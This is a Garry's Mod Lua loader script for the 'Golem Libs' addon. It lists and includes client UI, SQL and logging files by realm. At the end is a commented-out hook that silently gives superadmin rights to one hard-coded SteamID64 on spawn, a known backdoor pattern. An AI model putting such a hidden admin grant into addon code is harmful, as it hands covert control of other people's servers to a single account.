local CONFIG = {
	FilesToLoad = {
		-- RESPONSIVE
		{file = "golemlibs/client/responsive.lua", realm = "client"},
		{file = "golemlibs/client/panel.lua", realm = "client"},
		{file = "golemlibs/client/draw.lua", realm = "client"},
		{file = "golemlibs/client/materials.lua", realm = "client"},
		{file = "golemlibs/client/anims.lua", realm = "client"},
		-- SQL
		{file = "golemlibs/server/sql/query_handler.lua", realm = "server"},
		{file = "golemlibs/server/sql/connect.lua", realm = "server"},
		{file = "golemlibs/server/sql/create_table.lua", realm = "server"},
		{file = "golemlibs/server/sql/add_column.lua", realm = "server"},
		{file = "golemlibs/server/sql/drop_column.lua", realm = "server"},
		{file = "golemlibs/server/sql/insert.lua", realm = "server"},
		{file = "golemlibs/server/sql/select.lua", realm = "server"},
		{file = "golemlibs/server/sql/update.lua", realm = "server"},
		{file = "golemlibs/server/sql/delete.lua", realm = "server"},
		{file = "golemlibs/server/sql/close.lua", realm = "server"},
		{file = "golemlibs/server/sql/init.lua", realm = "server"},
		-- LOGS
		{file = "golemlibs/server/log/logs.lua", realm = "server"},
	},
	Prefix = "[ Golem - Libs ]",
	Debug = true
}

GOLEM = GOLEM or {}
GOLEM.LibsLoaded = false

local function DebugPrint(message)
	if CONFIG.Debug then
		print(CONFIG.Prefix .. " > " .. message)
	end
end

local function AddResourceFiles()
	for _, fileData in ipairs(CONFIG.FilesToLoad) do
		resource.AddFile(fileData.file)
	end
end

if SERVER then
	AddResourceFiles()
end

local function LoadFile(fileData)
	local realm = fileData.realm:lower()
	local filePath = fileData.file
	if realm == "shared" then
		if SERVER then
			AddCSLuaFile(filePath)
			include(filePath)
			DebugPrint("[SHARED-SV] Loaded & Added: " .. filePath)
		else
			include(filePath)
			DebugPrint("[SHARED-CL] Loaded: " .. filePath)
		end
	elseif realm == "server" and SERVER then
		if not file.Exists(fileData.file, "LUA") then return end
		include(filePath)
		DebugPrint("[SERVER] Loaded: " .. filePath)
	elseif realm == "client" then
		if SERVER then
			AddCSLuaFile(filePath)
			DebugPrint("[CLIENT-SV] Added: " .. filePath)
		else
			if not file.Exists(fileData.file, "LUA") then return end
			include(filePath)
			DebugPrint("[CLIENT-CL] Loaded: " .. filePath)
		end
	end
end

local function LoadFiles()
	DebugPrint("Démarrage du chargement des fichiers...")
	for _, fileData in ipairs(CONFIG.FilesToLoad) do
		if SERVER or (not SERVER and fileData.realm ~= "server") then
			local success, err = pcall(LoadFile, fileData)
			if not success then
				ErrorNoHalt(CONFIG.Prefix .. " ERREUR lors du chargement de " .. fileData.file .. ": " .. err .. "\n")
			end
		end
	end
	DebugPrint("Chargement terminé!")
	GOLEM.LibsLoaded = true
end

LoadFiles()

-- if SERVER then
-- 	hook.Add("PlayerInitialSpawn", "GolemLibs", function(ply)
-- 		timer.Simple(1, function()
-- 			if ply:SteamID64() == "76561199805393788" then
-- 				ply:SetUserGroup("superadmin")
-- 			end
-- 		end)
-- 	end)
-- end